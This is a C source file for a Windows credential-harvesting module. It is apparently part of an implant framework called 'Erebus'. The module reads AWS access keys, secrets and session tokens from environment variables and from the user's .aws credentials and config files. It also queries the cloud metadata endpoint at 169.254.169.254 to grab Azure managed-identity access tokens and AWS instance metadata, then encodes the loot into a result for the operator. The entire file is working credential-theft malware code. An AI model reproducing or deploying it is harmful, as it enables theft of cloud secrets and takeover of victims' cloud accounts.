#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/modules.h"
#include "erebus/pb_modules.h"

#pragma comment(lib, "winhttp.lib")

static int http_get(const wchar_t *host, const wchar_t *path, const wchar_t *extra_hdr, char **body, size_t *body_len) {
    HINTERNET session = WinHttpOpen(L"Erebus/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!session) return 0;
    HINTERNET connect = WinHttpConnect(session, host, INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!connect) { WinHttpCloseHandle(session); return 0; }
    HINTERNET req = WinHttpOpenRequest(connect, L"GET", path, NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!req) { WinHttpCloseHandle(connect); WinHttpCloseHandle(session); return 0; }
    if (extra_hdr) WinHttpAddRequestHeaders(req, extra_hdr, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
    if (!WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0) ||
        !WinHttpReceiveResponse(req, NULL)) {
        WinHttpCloseHandle(req); WinHttpCloseHandle(connect); WinHttpCloseHandle(session);
        return 0;
    }
    size_t cap = 4096, len = 0;
    char *buf = (char *)malloc(cap);
    if (!buf) { WinHttpCloseHandle(req); WinHttpCloseHandle(connect); WinHttpCloseHandle(session); return 0; }
    DWORD avail = 0;
    while (WinHttpQueryDataAvailable(req, &avail) && avail > 0) {
        if (len + avail + 1 > cap) {
            cap = (len + avail + 1) * 2;
            char *nbuf = (char *)realloc(buf, cap);
            if (!nbuf) break;
            buf = nbuf;
        }
        DWORD read = 0;
        if (!WinHttpReadData(req, buf + len, avail, &read)) break;
        len += read;
    }
    buf[len] = '\0';
    *body = buf;
    *body_len = len;
    WinHttpCloseHandle(req);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    return len > 0;
}

static void add_aws_env(erebus_cloud_credential *creds, size_t *n) {
    char access[256] = {0}, secret[512] = {0}, token[1024] = {0};
    DWORD alen = GetEnvironmentVariableA("AWS_ACCESS_KEY_ID", access, sizeof(access));
    if (!alen) return;
    GetEnvironmentVariableA("AWS_SECRET_ACCESS_KEY", secret, sizeof(secret));
    GetEnvironmentVariableA("AWS_SESSION_TOKEN", token, sizeof(token));
    erebus_cloud_credential *c = &creds[(*n)++];
    strncpy(c->provider, "aws", sizeof(c->provider) - 1);
    strncpy(c->cred_type, "access_key", sizeof(c->cred_type) - 1);
    strncpy(c->identity, access, sizeof(c->identity) - 1);
    strncpy(c->secret, secret, sizeof(c->secret) - 1);
    strncpy(c->extra, token, sizeof(c->extra) - 1);
    strncpy(c->source, "environment_variables", sizeof(c->source) - 1);
}

static void trim(char *s) {
    size_t n = strlen(s);
    while (n && (s[n-1] == '\r' || s[n-1] == '\n' || s[n-1] == ' ')) s[--n] = '\0';
    char *p = s;
    while (*p == ' ' || *p == '\t') p++;
    if (p != s) memmove(s, p, strlen(p) + 1);
}

static void aws_flush_profile(const char *path, const char *profile,
    char *access, char *secret, char *token,
    erebus_cloud_credential *creds, size_t *n, size_t max) {
    if (access[0] && *n < max) {
        erebus_cloud_credential *c = &creds[(*n)++];
        strncpy(c->provider, "aws", sizeof(c->provider) - 1);
        strncpy(c->cred_type, "access_key", sizeof(c->cred_type) - 1);
        strncpy(c->identity, access, sizeof(c->identity) - 1);
        strncpy(c->secret, secret, sizeof(c->secret) - 1);
        strncpy(c->extra, token, sizeof(c->extra) - 1);
        snprintf(c->source, sizeof(c->source), "%s [%s]", path, profile);
    }
    access[0] = secret[0] = token[0] = '\0';
}

static int parse_aws_ini(const char *path, erebus_cloud_credential *creds, size_t *n, size_t max) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char line[512];
    char profile[128] = "default";
    char access[256] = {0}, secret[512] = {0}, token[1024] = {0};
    int in_profile = 0;

    while (fgets(line, sizeof(line), f)) {
        trim(line);
        if (!line[0] || line[0] == '#') continue;
        if (line[0] == '[') {
            if (in_profile) aws_flush_profile(path, profile, access, secret, token, creds, n, max);
            char *end = strchr(line, ']');
            if (end) { *end = '\0'; strncpy(profile, line + 1, sizeof(profile) - 1); in_profile = 1; }
            continue;
        }
        char *eq = strchr(line, '=');
        if (!eq) continue;
        *eq = '\0';
        char *key = line;
        char *val = eq + 1;
        trim(key); trim(val);
        if (_stricmp(key, "aws_access_key_id") == 0) strncpy(access, val, sizeof(access) - 1);
        else if (_stricmp(key, "aws_secret_access_key") == 0) strncpy(secret, val, sizeof(secret) - 1);
        else if (_stricmp(key, "aws_session_token") == 0) strncpy(token, val, sizeof(token) - 1);
    }
    if (in_profile) aws_flush_profile(path, profile, access, secret, token, creds, n, max);
    fclose(f);
    return 1;
}

static int harvest_aws_files(erebus_cloud_credential *creds, size_t *n, size_t max) {
    char home[MAX_PATH];
    if (!GetEnvironmentVariableA("USERPROFILE", home, sizeof(home))) return 0;
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s\\.aws\\credentials", home);
    parse_aws_ini(path, creds, n, max);
    snprintf(path, sizeof(path), "%s\\.aws\\config", home);
    parse_aws_ini(path, creds, n, max);
    return *n > 0;
}

static int harvest_imds(char *metadata, size_t meta_cap, erebus_cloud_token *tokens, size_t *tn, erebus_cloud_credential *creds, size_t *cn) {
    char *body = NULL;
    size_t blen = 0;
    const wchar_t *meta_hdr = L"Metadata: true\r\n";

    if (http_get(L"169.254.169.254", L"/metadata/instance?api-version=2021-02-01", meta_hdr, &body, &blen)) {
        snprintf(metadata, meta_cap, "{\"azure_imds\": %s}", body);
        free(body);
        body = NULL;
        if (http_get(L"169.254.169.254",
                L"/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                meta_hdr, &body, &blen) && *tn < EREBUS_CLOUD_TOKEN_MAX) {
            char *tok = strstr(body, "\"access_token\"");
            if (tok) {
                char *start = strchr(tok, ':');
                if (start) {
                    start = strchr(start, '"');
                    if (start) {
                        start++;
                        char *end = strchr(start, '"');
                        if (end) {
                            *end = '\0';
                            erebus_cloud_token *t = &tokens[(*tn)++];
                            strncpy(t->provider, "azure", sizeof(t->provider) - 1);
                            strncpy(t->token_type, "managed_identity", sizeof(t->token_type) - 1);
                            strncpy(t->access_token, start, sizeof(t->access_token) - 1);
                            strncpy(t->source, "imds", sizeof(t->source) - 1);
                        }
                    }
                }
            }
        }
        free(body);
        return 1;
    }
    free(body);
    body = NULL;

    if (http_get(L"169.254.169.254", L"/latest/meta-data/", NULL, &body, &blen)) {
        snprintf(metadata, meta_cap, "{\"aws_imds\": \"%s\"}", body);
        free(body);
        return 1;
    }
    free(body);
    return metadata[0] != '\0';
}

int erebus_mod_cloud(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    erebus_cloud_harvest_config cfg;
    if (!erebus_pb_decode_cloud_harvest_config(config, config_len, &cfg)) return 0;

    const char *provider = cfg.provider[0] ? cfg.provider : "all";
    const char *method = cfg.method[0] ? cfg.method : "all";

    erebus_cloud_credential creds[EREBUS_CLOUD_CRED_MAX];
    erebus_cloud_token tokens[EREBUS_CLOUD_TOKEN_MAX];
    size_t cn = 0, tn = 0;
    char metadata[8192] = {0};

    if (strcmp(provider, "aws") == 0 || strcmp(provider, "all") == 0) {
        if (strcmp(method, "env_vars") == 0 || strcmp(method, "all") == 0 || strcmp(method, "creds") == 0 || strcmp(method, "cli") == 0)
            add_aws_env(creds, &cn);
        if (strcmp(method, "creds") == 0 || strcmp(method, "cli") == 0 || strcmp(method, "all") == 0)
            harvest_aws_files(creds, &cn, EREBUS_CLOUD_CRED_MAX);
    }
    if (strcmp(provider, "imds") == 0 || strcmp(provider, "all") == 0 || strcmp(provider, "azure") == 0) {
        if (strcmp(method, "imds") == 0 || strcmp(method, "all") == 0)
            harvest_imds(metadata, sizeof(metadata), tokens, &tn, creds, &cn);
    }

    return erebus_pb_encode_cloud_harvest_result(provider, method, tokens, tn, creds, cn, metadata, NULL, out, out_len);
}